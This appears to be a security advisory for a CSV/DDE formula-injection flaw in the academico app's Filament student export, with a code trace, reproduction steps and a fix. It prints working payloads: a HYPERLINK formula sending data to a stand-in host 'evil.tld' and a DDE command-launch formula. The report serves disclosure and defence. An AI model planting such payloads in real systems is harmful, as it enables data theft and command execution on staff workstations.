# VULN-006 — CSV / DDE formula injection in Filament exports via unauthenticated-controllable name/ID fields

| | |
|---|---|
| **ID** | VULN-006 |
| **Severity** | Medium |
| **CVSS 3.1** | 6.1 — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **Status** | **CONFIRMED (dynamic)** — injection confirmed; formula *execution* is spreadsheet-dependent |
| **Affected commit** | `a6518355c3a30818044c46a9fc7fd53da34ab7f7` |
| **Auth required** | None to inject (public registration); a staff member opens the export |
| **Attacker gains** | Executes/exfiltrates on the workstation of any staff member who exports and opens the student list |

## Summary

Filament's Student export writes each column value straight into a CSV cell; the underlying
openspout writer applies no CSV-injection hardening. The `idnumber`, `lastname`, `firstname`,
and `email` columns come from public self-registration. An unauthenticated attacker registers
with a name/ID that begins with a formula character (`=`, `+`, `-`, `@`); when a staff member
later exports Students to CSV and opens it in Excel or LibreOffice Calc, the value is evaluated
as a formula. Proven live: after an anonymous registration with `lastname =
'=HYPERLINK("http://evil.tld/…","clickme")'` and `idnumber = "=cmd|'/c calc'!A0"`, the admin's
generated CSV contained the attacker's row with both cells starting with `=`, unescaped.

## How it works (mechanism & code trace)

**Source (unauthenticated)** — `targets/academico/app/Livewire/RegistrationWizard.php:182-199`
creates the `User`/`Student` from public properties (`lastname`, `idnumber`, …) with no
formula-character filtering (and, via [VULN-007], no effective format validation at all).

**The name accessors preserve the leading formula char** —
`targets/academico/app/Models/User.php:66-74`:

```php
public function getFirstnameAttribute($value) { return Str::title($value); }
public function getLastnameAttribute($value)  { return Str::upper($value); }
```

`Str::upper`/`Str::title` change case but leave a leading `=`/`+`/`-`/`@` intact (formula names
are case-insensitive), so `=hyperlink(...)` becomes `=HYPERLINK(...)` — still a formula.

**The sink — export columns written raw** —
`targets/academico/app/Filament/Exports/StudentExporter.php:16-29`:

```php
return [
    ExportColumn::make('idnumber')->label(__('ID')),
    ExportColumn::make('user.lastname')->label(__('Last name')),
    ExportColumn::make('user.firstname')->label(__('First name')),
    ExportColumn::make('user.email')->label(__('Email')),
    ...
];
```

Filament renders each `ExportColumn` value into a cell via the openspout CSV `Writer`, which
performs **no** CSV-injection neutralization (it does not prefix cells that begin with a formula
character, and offers no such option here). The value is emitted verbatim (CSV-quoted if it
contains a comma/quote, but the leading `=` remains the first content character).

**Observed output** (this run, read from `storage/app/private/filament_exports/<id>/*.csv`):

```
"=cmd|'/c calc'!A0","=HYPERLINK(""HTTP://EVIL.TLD/A96D3EF9"",""CLICKME"")",Csva96D3Ef9,csv_a96d3ef9@example.invalid,"26 years old",
```

Both the `idnumber` and `lastname` cells begin with `=` — no `'`/space/tab prefix was added.

## Why it is a vulnerability (reasoning)

The trust boundary crossed is from the web application to the *exporting staff member's
workstation* (scope change, `S:C`): an unauthenticated internet user causes formula/DDE content
to be planted in a file that a trusted internal user opens in a desktop application. The broken
assumption is that exported data is inert text; Excel and LibreOffice Calc treat any cell whose
first character is `=`, `+`, `-`, or `@` as a formula to evaluate. `=HYPERLINK(...)` /
`=WEBSERVICE(...)` exfiltrate cell/context data to the attacker's server on click or open;
`=cmd|'/c calc'!A0`-style DDE can launch commands where DDE is enabled and the security prompt
is accepted. The application's own responsibility — neutralizing formula-leading cells before
writing them — is not met. Note this is a genuine but *conditional* impact: the final execution
step happens in the victim's spreadsheet, not on the server, so its realization depends on that
client's settings (which is why the class is scored Medium, not High).

## Reproduction

1. Target up at `http://localhost:20000`.
2. Run `./run.sh`. It registers a malicious student (unauthenticated), logs in as admin, triggers
   the Students CSV export (`mountAction('export',{},{table:true})` → `callMountedAction`), drains
   the export queue (`queue:work`), and reads the generated CSV from the container.
3. Expected output (`run.log`, this run):
   ```
   stored lastname = '=HYPERLINK("HTTP://EVIL.TLD/A96D3EF9","CLICKME")'
   attacker row in export CSV: "=cmd|'/c calc'!A0","=HYPERLINK(...)",Csv...,csv_...@example.invalid,...
   ```
   Verdict: `CONFIRMED`. Full capture: `request.http`, `response.txt`, `run.log`.
4. **Manual final step (the client-side execution):** open the exported `.csv` in Excel or
   LibreOffice Calc; `=HYPERLINK` renders a clickable exfiltration link; `=cmd|...` prompts for DDE
   and, if accepted, executes the command. This step needs a real spreadsheet app and is not
   automated here.

## Impact

An anonymous user plants content that, when a secretary/admin exports and opens the student list,
can (a) silently exfiltrate data via `HYPERLINK`/`WEBSERVICE` to an attacker host, or (b) execute
commands via DDE where enabled — on a trusted internal workstation. Blast radius is each staff
machine that opens an export. Amplified by [VULN-007] (removes name-format constraints) and
[VULN-010]/[VULN-008] (mass, unbounded planting).

## Suggested fix

Neutralize formula-leading cells at export time. In `StudentExporter` (and the Course/Enrollment
exporters), pass every user-controlled column through a formatter that prefixes a leading
`= + - @` (and tab/CR) with a single quote (or strips it):

```php
ExportColumn::make('user.lastname')
    ->formatStateUsing(fn (?string $s) => preg_replace('/^([=+\-@\t\r])/', "'\$1", (string) $s));
```

Prefer a shared helper applied to all string columns. Principle: treat exported data as
potentially executable by the consuming application and neutralize it at the boundary
(defense that does not depend on the recipient's spreadsheet settings).

## References

- OWASP — **CSV Injection / Formula Injection**:
  <https://owasp.org/www-community/attacks/CSV_Injection>
- OWASP WSTG — **WSTG-INPV-15** (Testing for CSV Injection).
- Google Sheets/Excel formula behavior; `HYPERLINK`/`WEBSERVICE` exfiltration and DDE command
  execution write-ups (PortSwigger / research blogs on spreadsheet formula injection).

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 80 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. GitHub Advisory Database query `academico`, NVD API `keywordSearch=academico`, OSV query `academico`, huntr repo page — only CVE-2025-10763 (`/edit-photo` upload); nothing on CSV or exports.
2. academico-sis/academico published advisories + issue/PR search `security` + `main` commit log through 2026-10-21 — no CSV-injection fix; `app/Filament/Exports/StudentExporter.php` has a single commit (Mar 2026) and current `main` `getColumns()` uses bare `ExportColumn::make()` with no `preventFormulaInjection()`.
3. GitHub Advisory Database query `filament` (33 advisories by title) — no CSV formula-injection advisory for Filament exports.
4. filamentphp/filament tracker query `csv injection export` — only PR #20161 "Add opt-in CSV formula injection protection to exports" (merged 2026-07-12, labelled enhancement, no advisory); Filament 4.x docs confirm `preventFormulaInjection()` is opt-in and disabled by default.

**Related but distinct public references** (same class or component, not this bug):
- filamentphp/filament PR #20161 and the docs section "CSV formula injection" — framework-level opt-in mitigation, not a disclosure about academico; academico does not opt in.
- CVE-2024-34448 (Ghost) and other CWE-1236 CVEs — same class in other products.
- CVE-2025-10763 / GHSA-52xw-7w25-5w5q (academico `/edit-photo`) — different component.

**Reasoning:** No advisory, issue or fix covers formula injection in academico's Student/Course/Enrollment exports, and the exporter on `main` still does not enable Filament's opt-in protection. CSV injection is a common and sometimes-disputed class (execution depends on the victim's spreadsheet), so the vendor may deprioritise it, but nothing public matches this component. All academico checks were direct GHSA/NVD/OSV/repository queries because the web-search quota was exhausted earlier in this triage.
